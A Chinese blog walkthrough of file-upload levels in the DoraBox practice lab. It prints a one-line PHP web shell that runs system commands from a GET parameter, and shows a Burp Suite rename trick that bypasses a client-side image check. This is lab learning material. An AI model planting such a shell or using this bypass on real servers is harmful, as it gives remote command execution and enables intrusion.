---
title: DoraBox文件上传（一）
tags: 
  -	Web
  - 渗透
categories:
  -	Web渗透
keywords:
  -	渗透
  - web
  - 文件上传
cover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fi0.hdslb.com%2Fbfs%2Farticle%2F82b9f952163ac71a105b2e6a016c206024bcdd3e.png&refer=http%3A%2F%2Fi0.hdslb.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1639053077&t=dae135b6c65702724a383ad4b100f6c8
abbrlink: 3245c130
---









## 任意文件上传

点击了解一句话木马：[一句话木马](https://blog.csdn.net/weixin_39190897/article/details/86772765)



题目写的是任意文件上传，所以我们直接上床一个一句话木马

```
<?php @system($_GET[a]);?>
```

![](/img/DoraBoxwenjianshangchuan/1.png)

![](/img/DoraBoxwenjianshangchuan/2.png)

![](/img/DoraBoxwenjianshangchuan/3.png)

是不是很简单

![](https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.b7.cn%2Fd%2Ffile%2F20190819%2F1d4db9dadbddf0772ace1092555b7f7f.jpg&refer=http%3A%2F%2Fwww.b7.cn&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1639050378&t=b99c9d9ce87a7ef370d059231c50c7bf)

接下来根据Stored所给路径访问测试

![](/img/DoraBoxwenjianshangchuan/4.png)

![](https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fc-ssl.duitang.com%2Fuploads%2Fitem%2F201809%2F08%2F20180908125730_24yjX.thumb.400_0.gif&refer=http%3A%2F%2Fc-ssl.duitang.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1639050617&t=994416a4df563a4bde61818e0cde1978)

## JS限制文件上传

一样先用php文件上传

提示只能上传图片

![](/img/DoraBoxwenjianshangchuan/5.png)

![](https://img1.baidu.com/it/u=2010333076,1637543918&fm=26&fmt=auto)

既然这样我们就由我们的Burp闪亮登场（记得开代理）

首先先把我们的php文件改成jpg为后缀

![](/img/DoraBoxwenjianshangchuan/6.png)

上传抓包

![](/img/DoraBoxwenjianshangchuan/7.png)

![](/img/DoraBoxwenjianshangchuan/8.png)

把jpg修改成php

![](https://img0.baidu.com/it/u=3981365252,242824101&fm=26&fmt=auto)

![](/img/DoraBoxwenjianshangchuan/9.png)

![](https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fc-ssl.duitang.com%2Fuploads%2Fitem%2F202004%2F06%2F20200406035818_aAdHP.thumb.1000_0.jpg&refer=http%3A%2F%2Fc-ssl.duitang.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1639052635&t=e01c72d8f9b3929f131642a6a859e434)

放包，上传成功！（记得换个文件名，我忘了）

![](/img/DoraBOxwenjianshangchuan/10.png)

测试

![](/img/DoraBoxwenjianshangchuan/11.png)

接着

等待下一章更新

![](https://img1.baidu.com/it/u=1752911575,356243476&fm=26&fmt=auto)
